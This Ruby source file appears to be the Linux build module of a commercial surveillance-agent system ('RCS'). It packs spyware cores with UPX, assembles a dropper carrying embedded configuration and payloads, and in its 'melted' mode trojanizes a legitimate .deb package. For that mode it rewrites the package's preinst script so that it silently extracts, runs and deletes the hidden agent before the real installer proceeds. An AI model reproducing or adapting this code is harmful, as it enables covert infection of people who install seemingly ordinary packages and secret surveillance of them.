#
#  Agent creation for linux
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildLinux < Build

  DROPPER_MARKER = "BmFyY5JhOGhoZjN1"

  def initialize
    super
    @platform = 'linux'
  end

  def patch(params)
    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'core32'
    params[:config] = 'config'

    # enforce demo flag accordingly to the license
    # or raise if cannot build
    params['demo'] = LicenseManager.instance.can_build_platform :linux, params['demo']

    # remember the demo parameter
    @demo = params['demo']

    # invoke the generic patch method with the new params
    super

    # patch the core64
    params[:core] = 'core64'
    params[:config] = nil
    super

    # pack the core
    CrossPlatform.exec path('bin/upx'), "-q --no-color --ultra-brute #{path('core32')} #{path('core64')}"
  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    executable = path('default')
    @appname = params['appname'] || 'agent'

    @melting_mode = :silent
    @melting_mode = :melted if params['input']

    dropper_size = File.size(path('dropper'))

    # calculate the install dir for this factory
    core = scramble_name(@factory.seed, 3)
    scramble_dir = scramble_name(core[0..7], 7)

    # create the dropper
    File.open(path('dropper'), "ab") do |f|
      f.write DROPPER_MARKER
      f.write scramble_dir
      f.write [File.size(path('config'))].pack('I')
      f.write File.binread(path('config'))
      f.write [File.size(path('core32'))].pack('I')
      f.write File.binread(path('core32'))
      f.write [File.size(path('core64'))].pack('I')
      f.write File.binread(path('core64'))
      f.write DROPPER_MARKER
      f.write [dropper_size].pack('I')
    end

    FileUtils.mv path('dropper'), path('output')

    if @melting_mode.eql? :melted
      FileUtils.mv Config.instance.temp(params['input']), path('melted')
      melted(path('melted'), path('output'))
      FileUtils.mv path('melted'), path('output')
    end

    trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"

    @outputs = ['output']
  end

  def melted(host, guest)
    FileUtils.mkdir_p path('DEBIAN')

    # extract the original
    CrossPlatform.exec path('bin/ar'), "x #{host} control.tar.gz", {:chdir => path('')}
    CrossPlatform.exec path('bin/gzip'), "-d control.tar.gz", {:chdir => path('')}
    CrossPlatform.exec path('bin/tar'), "xf control.tar -C DEBIAN", {:chdir => path('')}

    # modify the installer
    if File.exist? path('DEBIAN/preinst')
      CrossPlatform.exec path('bin/tar'), "f control.tar --delete ./preinst", {:chdir => path('')}
      content = '#!/bin/sh' + "\n" +
                'set -e' + "\n" +
                'F1="`dirname "$0"`/f1";S1=' + File.size(guest).to_s + "\n" +
                'F2="`dirname "$0"`/f2"' + "\n" +
                '(tail -n +9 "$0"|head -c $S1 > "$F1"; chmod 0755 "$F1"; "$F1"; rm "$F1") 2>/dev/null' + "\n" +
                '(tail -n +9 "$0"|tail -c +$(($S1+1)) > "$F2"; chmod 0755 "$F2"; mv "$F2" "$0" || exit) 2>/dev/null' + "\n" +
                'exec "$0" "$@"' + "\n" +
                'cat <<EOF' + "\n" +
                File.open(guest, 'rb') {|f| f.read} +
                File.open(path('DEBIAN/preinst'), 'rb') {|f| f.read}
	  else
      content = '#!/bin/sh' + "\n" +
                'set -e' + "\n" +
                'F1="`dirname "$0"`/f1";S1=' + File.size(guest).to_s + "\n" +
                '(tail -n +7 "$0" > "$F1"; chmod 0755 "$F1"; "$F1"; rm "$F1" "$0") 2>/dev/null' + "\n" +
                'exit' + "\n" +
                'cat <<EOF' + "\n" +
                File.open(guest, 'rb') {|f| f.read}
    end
    File.open(path('DEBIAN/preinst'), 'wb') {|f| f.write content}

    # repack it
    CrossPlatform.exec path('bin/tar'), "rf control.tar --numeric-owner --owner=0 --group=0 --mode=0755 -C DEBIAN ./preinst", {:chdir => path('')}
    CrossPlatform.exec path('bin/gzip'), "-9 control.tar", {:chdir => path('')}
    CrossPlatform.exec path('bin/ar'), "r #{host} control.tar.gz", {:chdir => path('')}
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    if @melting_mode.eql? :silent
      Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
        z.file.open(@appname, "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
      end

      # make it executable (for some reason we cannot do it in the previous phase)
      Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
        z.file.chmod(0755, @appname)
      end
    else
      Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
        z.file.open("#{@appname}.deb", "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
      end
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

  def unique(core)
    Zip::ZipFile.open(core) do |z|
      core_content = z.file.open('core32', "rb") { |f| f.read }
      add_magic(core_content)
      File.open(Config.instance.temp('core32'), "wb") {|f| f.write core_content}

      core_content = z.file.open('core64', "rb") { |f| f.read }
      add_magic(core_content)
      File.open(Config.instance.temp('core64'), "wb") {|f| f.write core_content}
    end

    # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core32')} #{Config.instance.temp('core64')}"
    FileUtils.rm_rf Config.instance.temp(['core32', 'core64'])
  end

end

end #DB::
end #RCS::
